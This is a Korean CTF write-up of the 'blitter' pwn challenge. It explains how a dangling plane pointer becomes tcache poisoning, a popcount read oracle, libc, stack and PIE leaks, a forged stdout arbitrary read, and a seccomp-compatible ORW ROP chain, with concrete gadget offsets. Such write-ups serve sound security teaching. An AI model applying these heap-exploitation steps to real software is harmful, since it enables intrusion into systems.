---
title: "[2026 UHCON CTF] blitter"
date: 2026-10-31 11:11:52 +0900
categories: [CTF/Wargame]
tags: [ctf, pwn, heap, tcache, seccomp]
---

# blitter - 대형 Tcache 청크와 디스플레이 명령 처리 취약점 공격

## 1. 문제 개요

- 서비스: `nc 3.36.45.164 11011`
- 대상: blitter/디스플레이 장치를 패널과 plane 단위로 제어하는 바이너리
- 목표: 컨테이너의 `/flag` 획득
- 최종 익스플로잇: [`work_blitter/solve.py`](work_blitter/solve.py)

최종 플래그는 다음과 같다.

```text
FLAG{943befecdfe393a8378a54f664b0429bdb99a18f7a16e0b15222b465d0d6355cb31f16ed6df7e9edf151fd69277354955759f97f368a1d9e40782c07605f485273d7cf604db0b545}
```

## 2. 배포 환경

`run.sh` 내용은 다음과 같다.

```bash
export GLIBC_TUNABLES=glibc.malloc.tcache_max=4294967296:glibc.cpu.x86_rep_stosb_threshold=2056
exec timeout 330 /home/ctf/blitter
```

제공된 libc는 Ubuntu GLIBC 2.43이며, `tcache_max`가 큰 값으로 설정되어 큰 청크도 tcache에 들어간다. 사이즈별 tcache 카운트는 16이다.

바이너리 보호 기법은 다음과 같다.

| 보호 기법 | 상태 |
|---|---|
| PIE | Enabled |
| NX | Enabled |
| Stack Canary | Enabled |
| RELRO | Full RELRO |
| Seccomp | Enabled |

GOT overwrite는 불가능하고 주소 누출 없이 고정 주소를 사용할 수도 없다.

## 3. 입력 프로토콜

서비스는 먼저 little-endian `uint16_t` 길이를 받고, 해당 길이만큼의 바이트코드 목록을 읽는다. 정수 인자는 ULEB128 형태로 인코딩된다.

```text
[2-byte command list length][command list]
```

역어셈블링으로 복원한 주요 명령은 다음과 같다.

| Opcode | 기능 | 인자 |
|---|---|---|
| `0xa1` | 패널 할당 | `id, burst, width, height` |
| `0xa2` | 패널 해제 | `id` |
| `0xa4` | 패널 데이터 쓰기 | `id, offset, length, data` |
| `0xb1` | 패널을 plane에 bind | `plane, panel_id` |
| `0xb2` | plane unbind | `plane` |
| `0xb3` | plane 데이터 XOR | `plane, offset, length, data` |
| `0xc1` | 패널의 전체 popcount 출력 | `panel_id` |

패널은 대략 다음과 같은 24바이트 구조체다.

```c
struct panel {
    void    *ptr;       // +0x00
    uint16_t width;     // +0x08
    uint16_t height;    // +0x0a
    uint32_t stride;    // +0x0c
    size_t   size;      // +0x10
};
```

plane은 패널의 포인터와 크기만 복사한다.

```c
struct plane {
    void   *ptr;
    size_t  size;
};
```

## 4. 취약점: plane에 남는 dangling pointer

`bind` 명령은 패널의 포인터와 크기를 plane에 shallow copy한다. 그런데 패널을 `free`할 때 패널 슬롯만 0으로 초기화하고, 해당 패널을 참조하는 plane은 제거하지 않는다.

```text
panel allocation
      |
      +---- panel[id].ptr
      |
      +---- plane[n].ptr

free(panel[id])
      |
      +---- panel[id] = 0
      +---- plane[n].ptr remains unchanged
```

따라서 plane의 XOR 명령으로 해제된 힙 청크의 user area를 계속 변조할 수 있다. 해제된 tcache 청크의 첫 16바이트에는 `next`와 `key`가 저장되므로, 이 UAF는 tcache metadata 변조 원시 기능이 된다.

## 5. Safe-Linking과 힙 주소 누출

glibc tcache의 Safe-Linking은 다음 공식을 사용한다.

```text
encoded_next = next ^ (entry_address >> 12)
```

### 5.1 tcache self-cycle로 같은 청크를 두 번 할당

0x100바이트 패널 세 개 `X`, `Y`, `Z`를 할당하면 배포 환경에서 user pointer 간격이 0x140으로 일정하다.

`Y`를 먼저 해제하고 `X`를 해제하면 `X->next` 내용은 다음과 같다.

```text
X->next = Y ^ (X >> 12)
```

이 값에 `X ^ Y`를 XOR하면 다음과 같이 `X` 자신을 가리키는 tcache 엔트리가 된다.

```text
(Y ^ (X >> 12)) ^ (X ^ Y)
= X ^ (X >> 12)
```

실제 배치에서 `X ^ Y = 0x7c0`이었다. 이후 같은 크기를 두 번 할당하면 두 패널 슬롯이 모두 `X`를 가리킨다.

### 5.2 popcount를 1비트 read oracle로 사용

`0xc1` 명령은 패널 전체의 1비트 개수를 출력한다.

1. 현재 popcount를 저장한다.
2. UAF plane으로 읽고 싶은 비트 하나를 XOR한다.
3. 패널 alias에 다시 popcount를 요청한다.
4. 값이 1 감소했으면 원래 비트는 1, 1 증가했으면 원래 비트는 0이다.

이 과정을 64번 반복하면 tcache의 encoded `next` 포인터를 복원할 수 있다.

`Z = X + 0x280`이므로 누출값 `E`는 다음 공식을 만족한다.

```text
E = (X + 0x280) ^ (X >> 12)
```

다음 고정점 반복으로 `X`를 복원했다.

```python
x = E - 0x280
for _ in range(12):
    x = (E ^ (x >> 12)) - 0x280
```

## 6. Unsorted bin으로 libc base 누출

libc 누출에는 0x400바이트 패널을 사용했다. 정렬 할당이 만드는 선행 free chunk와 병합되면 unsorted-bin pointer가 alias 범위 앞쪽에 생기므로, 먼저 0x10바이트 더미 할당을 수행해 첫 victim의 `PREV_INUSE` 배치를 바꾸었다.

공격 순서는 다음과 같다.

1. 0x400바이트 패널 18개를 할당한다.
2. 앞의 두 청크로 self-cycle을 만들어 victim alias 두 개를 생성한다.
3. 나머지 16개를 해제해 해당 tcache bin을 모두 채운다.
4. victim alias 하나를 해제하면 tcache에 들어가지 못하고 unsorted bin에 연결된다.
5. 다른 alias로 victim을 참조하고 popcount oracle로 `fd` 포인터를 누출한다.

원격 libc에서 unsorted pointer offset은 `0x212ac8`이다.

```python
libc_base = leaked_arena_pointer - 0x212ac8
```

## 7. libc 전역 겹침과 stdout arbitrary read

### 7.1 libc 내의 자연 가짜 청크

원격 환경의 `libc + 0x212238`에는 실행 중 `0x8000`이라는 값이 있다. 따라서 바로 뒤인 `libc + 0x212240`을 user pointer로 보면 사이즈 0x8000의 가짜 청크가 된다.

0x7ff0바이트 할당은 malloc chunk size 0x8000이 된다. 이 크기의 청크를 plane에 bind한 후 해제하고, encoded NULL `next`에 목표 주소를 XOR하면 다음 tcache 엔트리가 libc 영역을 가리킨다.

```text
(chunk >> 12) ^ target
= target ^ (chunk >> 12)
```

같은 크기를 두 번 할당하면 첫 번째는 원래 힙 청크, 두 번째는 `libc + 0x212240`이 반환된다.

> 주의: 제공된 로더를 명시적으로 실행한 로컬 환경은 CPU tunable 값 차이로 이 자리의 실행 중 값이 달라질 수 있다. 최종 스크립트는 원격 환경에서 검증했다.

### 7.2 stdout 조작

이 할당은 libc data 영역을 0으로 덮으며 `_IO_2_1_stdout_` 구조체도 손상시킨다. 따라서 할당과 같은 명령 목록 안에서 즉시 stdout을 복구하면서 arbitrary read용 FILE 구조체로 변조했다.

핵심 필드는 다음과 같다.

```text
_flags         = 0xfbad1800
_IO_write_base = leak_target
_IO_write_ptr  = leak_target + leak_size
_IO_write_end  = leak_target + leak_size
_IO_buf_base   = leak_target
_IO_buf_end    = leak_target + leak_size
_fileno        = 1
vtable         = libc + _IO_file_jumps
```

서비스가 결과를 `printf` 할 때 `_IO_write_base`와 `_IO_write_ptr` 사이의 데이터가 fd 1로 flush되어 임의 메모리를 읽을 수 있다.

## 8. 스택과 PIE 누출

stdout read primitive으로 다음 체인을 수행했다.

1. `libc + 0x211ea0` GOT 엔트리를 읽어 ld.so의 `__libc_stack_end` 심볼 주소를 획득한다.
2. 해당 심볼을 역참조해 초기 스택 포인터를 획득한다.
3. 초기 스택의 `argc`, `argv`, `envp`, `auxv` 배치를 파싱한다.
4. `AT_PHDR` 값에서 ELF program header의 고정 offset 0x40을 빼 PIE base를 계산한다.

```python
pie_base = auxv[AT_PHDR] - 0x40
```

이후 초기 스택 아래 0x5000바이트를 스캔해 `libc + 0x2a601`을 찾았다. 이 값은 `__libc_start_call_main` 내에서 `main` 함수를 호출한 뒤의 복귀 주소다. 해당 값이 저장된 스택 슬롯이 최종 ROP overwrite 대상이다.

## 9. PIE BSS의 패널 테이블 겹치기

패널 테이블은 `PIE + 0x4100`에 있다. 그 바로 앞 `PIE + 0x4080`에 plane 테이블이 있으며, `plane[7].size`는 `PIE + 0x40f8`에 위치한다.

0x510바이트 패널을 plane 7에 bind하면 다음 배치가 된다.

```text
PIE + 0x40f8: 0x510              <- fake chunk size
PIE + 0x4100: panel table start  <- fake user pointer
```

미리 해제해 둔 0x500바이트 패널의 tcache `next`를 `PIE + 0x4100`으로 poisoning하고 같은 크기를 두 번 할당했다.

- 첫 번째 할당: 원래 힙 청크
- 두 번째 할당: `PIE + 0x4100`

두 번째 할당의 `memset` 이후 프로그램은 새 패널 기술자를 패널 테이블 안에 다시 기록한다. 결과적으로 해당 패널은 패널 테이블 자체를 가리킨다.

이 self-referential 패널을 이용해 다음 가짜 기술자를 설정했다.

| Panel | `ptr` | `size` | 용도 |
|---|---:|---:|---|
| 0 | `main` return slot | `0x1000` | 스택 ROP 쓰기 |
| 1 | `libc + 0x212240` | `0x7ff0` | stdout 복구 |
| 6 | `PIE + 0x4100` | `0x500` | 패널 테이블 추가 수정 |

`/flag\0`은 `PIE + 0x4400`에 기록했고, 플래그 버퍼는 `PIE + 0x4480`을 사용했다.

## 10. Seccomp와 최종 ORW ROP

seccomp 필터를 해석하면 다음과 같은 시스템 콜이 허용된다.

```text
read, write, open, openat, close, lseek, fstat, newfstatat,
getdents64, brk, munmap, getrandom, rt_sigreturn, exit, exit_group
```

`execve` 및 `system("/bin/sh")`은 사용할 수 없으므로 `open -> read -> write` ROP을 구성했다.

```text
open("/flag", O_RDONLY)
read(3, PIE + 0x4480, 0x100)
write(1, PIE + 0x4480, 0x100)
exit(0)
```

사용한 주요 libc offset은 다음과 같다.

| 기능 | libc offset |
|---|---:|
| `pop rdi; ret` | `0x11bcfa` |
| `pop rsi; ret` | `0x5c2e7` |
| `pop rbp; ret` | `0x28a8d` |
| `pop rdx; leave; ret` | `0xa018d` |
| `open` | `0x127bd0` |
| `read` | `0x128390` |
| `write` | `0x128e50` |
| `_exit` | `0xf7480` |

단순한 `pop rdx; ret` gadget이 없어 `pop rbp; ret` 및 `pop rdx; leave; ret`를 조합해 `rdx`를 설정했다. 피벗 위치는 ROP 체인 내의 다음 qword 위치로 계산했다.

마지막으로 0인 command-list length를 전송하면 `main` 함수가 종료되고, 덮어쓴 복귀 주소에서 ROP가 실행된다.

## 11. 재현

```bash
cd '/mnt/c/Users/amder/Downloads/울모해/work_blitter'
python3 -u solve.py
```

성공 시 주소 누출 후 다음과 같이 `/flag`가 출력된다.

```text
BLT-9000 display coprocessor ready
20 planes, 8 channels, 4096x96 max, burst 1<<5..1<<21
[+] heap chunk: ...
[+] libc base: ...
[+] ld __libc_stack_end symbol: ...
[+] initial stack pointer: ...
[+] PIE base: ...
[+] main return slot: ...
panel off
FLAG{...}
```

## 12. 요약

전체 공격 흐름은 다음과 같다.

```text
plane dangling pointer (UAF)
    -> freed tcache metadata XOR
    -> tcache self-cycle / duplicate panel alias
    -> popcount bit oracle
    -> heap leak
    -> tcache saturation + unsorted-bin metadata
    -> libc leak
    -> libc data overlap
    -> forged stdout arbitrary read
    -> initial stack + auxv leak
    -> PIE leak and main return-slot discovery
    -> PIE BSS panel-table overlap
    -> arbitrary stack write
    -> seccomp-compatible ORW ROP
    -> /flag
```

핵심은 단순한 UAF를 바로 코드 실행으로 연결한 것이 아니라, tcache duplicate alias와 popcount 출력을 결합해 주소 누출 원시 기능을 만든 뒤 순차적으로 임의 읽기·쓰기로 확장한 것이다.
